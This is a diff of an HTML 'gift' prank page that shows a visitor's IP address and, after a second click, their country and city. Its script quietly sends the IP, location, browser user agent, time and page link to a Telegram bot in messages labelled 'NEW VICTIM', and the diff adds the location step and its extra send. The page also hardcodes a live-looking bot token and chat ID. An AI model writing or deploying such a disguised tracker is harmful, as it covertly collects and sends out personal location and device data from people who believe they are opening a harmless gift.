@@ -6,7 +6,6 @@
   <title>GIFT FROM LETSIE</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Roboto:wght@700&display=swap');
-
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       background: #000;
@@ -20,7 +19,6 @@
       text-align: center;
       position: relative;
     }
-
     .circle {
       position: absolute;
       top: -30px;
@@ -32,14 +30,11 @@
       animation: fall linear infinite;
       opacity: 0.9;
     }
-
     @keyframes fall {
       0% { transform: translateY(-100px) scale(1); opacity: 1; }
       100% { transform: translateY(110vh) scale(0.5); opacity: 0; }
     }
-
     .container { position: relative; width: 90%; max-width: 400px; z-index: 10; }
-
     .box {
       background: rgba(15, 0, 0, 0.97);
       border: 4px solid #ff0000;
@@ -50,13 +45,11 @@
       opacity: 0;
       transform: translateY(-100px);
     }
-
     @keyframes drop {
       0% { opacity: 0; transform: translateY(-100px); }
       70% { opacity: 1; transform: translateY(25px); }
       100% { opacity: 1; transform: translateY(0); }
     }
-
     h1 {
       font-family: 'Orbitron', sans-serif;
       font-size: 2.4rem;
@@ -65,12 +58,10 @@
       margin-bottom: 20px;
       animation: glow 1.5s infinite alternate;
     }
-
     @keyframes glow {
       from { text-shadow: 0 0 15px #ff0000; }
       to { text-shadow: 0 0 25px #ff0000, 0 0 50px #ff1a1a, 0 0 70px #ff3333; }
     }
-
     .btn {
       background: #ff0000;
       color: #000;
@@ -80,19 +71,17 @@
       border: 3px solid #ff3333;
       border-radius: 50px;
       cursor: pointer;
-      margin: 25px 0;
+      margin: 15px 0;
       box-shadow: 0 0 25px #ff0000;
       transition: all 0.3s;
       font-family: 'Orbitron', sans-serif;
     }
-
     .btn:hover {
       background: #fff;
       color: #000;
       transform: scale(1.15);
       box-shadow: 0 0 40px #fff, 0 0 60px #ff0000;
     }
-
     .result {
       margin-top: 25px;
       font-size: 1.5rem;
@@ -103,7 +92,6 @@
       transition: opacity 1s;
       line-height: 1.8;
     }
-
     .by {
       margin-top: 30px;
       font-size: 1.7rem;
@@ -111,28 +99,34 @@
       font-family: 'Orbitron', sans-serif;
       animation: pulse 1.8s infinite;
     }
-
     @keyframes pulse {
       0%, 100% { transform: scale(1); }
       50% { transform: scale(1.15); }
     }
-
     .hidden { display: none; }
   </style>
 </head>
 <body>
-
   <div id="circles"></div>
-
   <div class="container">
     <div class="box">
       <h1>GIFT</h1>
       <p id="step1">CLICK ME TO REVEAL A SURPRISE</p>
       <button class="btn" onclick="reveal()">CLICK ME</button>
 
-      <div id="result" class="result hidden">
+      <!-- STEP 1: IP -->
+      <div id="result-ip" class="result hidden">
         This is ur ip adress if u didnt know <span style="font-size:2.2rem">😭👅</span><br>
         <span id="ip" style="color:#ff0000; font-size:1.8rem;">...</span>
+        <br><br>
+        <button class="btn" onclick="revealLocation()">CLICK ME FOR ANOTHER SURPRISE</button>
+      </div>
+
+      <!-- STEP 2: LOCATION -->
+      <div id="result-location" class="result hidden">
+        <div>Here’s where you are:</div>
+        <div id="country" style="color:#ff6666; font-size:1.6rem;">...</div>
+        <div id="city" style="color:#ff9999; font-size:1.6rem;">...</div>
       </div>
 
       <div class="by">BY ZENNY!</div>
@@ -155,43 +149,70 @@
 
     // === TELEGRAM BOT ===
     const BOT_TOKEN = '8501597773:AAG1l8FnPsKtOt8sJ7ejB0r-zSacGwpYuBI';
-    const CHAT_ID = '6726658638'; // ← REPLACE WITH YOUR REAL CHAT ID
+    const CHAT_ID = '6726658638'; // ← YOUR CHAT ID
+
+    let userIP = "";
 
     // === SEND TO TELEGRAM ===
-    function sendToTelegram(ip) {
+    function sendToTelegram(ip, country = "", city = "") {
       const time = new Date().toLocaleString();
       const ua = navigator.userAgent.substring(0, 100);
-      const message = `NEW VICTIM\n\nIP: ${ip}\nTime: ${time}\nDevice: ${ua}\nLink: ${location.href}`;
+      let message = `NEW VICTIM\n\nIP: ${ip}`;
+      if (country) message += `\nCountry: ${country}`;
+      if (city) message += `\nCity/Province: ${city}`;
+      message += `\nTime: ${time}\nDevice: ${ua}\nLink: ${location.href}`;
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
         .catch(() => {});
     }
 
-    // === GET IP + SHOW + SEND ===
+    // === STEP 1: GET IP ===
     function getIP() {
       fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
         .then(data => {
-          const ip = data.ip;
-          document.getElementById('ip').innerHTML = ip;
-          sendToTelegram(ip);
+          userIP = data.ip;
+          document.getElementById('ip').innerHTML = userIP;
+          sendToTelegram(userIP); // Send IP only
         })
         .catch(() => {
           document.getElementById('ip').innerHTML = "BLOCKED";
         });
     }
 
-    // === BUTTON WORKS ===
+    // === STEP 2: GET LOCATION FROM IP ===
+    function getLocation() {
+      fetch(`https://ipapi.co/${userIP}/json/`)
+        .then(r => r.json())
+        .then(data => {
+          const country = data.country_name || "Unknown";
+          const city = data.city || data.region || "Unknown";
+          document.getElementById('country').innerHTML = `Country: ${country}`;
+          document.getElementById('city').innerHTML = `City/Province: ${city}`;
+          sendToTelegram(userIP, country, city); // Send full info
+        })
+        .catch(() => {
+          document.getElementById('country').innerHTML = "Location: Blocked";
+        });
+    }
+
+    // === REVEAL IP ===
     function reveal() {
       document.getElementById('step1').classList.add('hidden');
       document.querySelector('.btn').classList.add('hidden');
-      const result = document.getElementById('result');
+      const result = document.getElementById('result-ip');
       result.classList.remove('hidden');
       setTimeout(() => result.style.opacity = 1, 100);
       getIP();
     }
-  </script>
 
+    // === REVEAL LOCATION ===
+    function revealLocation() {
+      document.querySelector('#result-ip .btn').classList.add('hidden');
+      const result = document.getElementById('result-location');
+      result.classList.remove('hidden');
+      setTimeout(() => result.style.opacity = 1, 100);
+      getLocation();
+    }
+  </script>
 </body>
 </html>
-
-
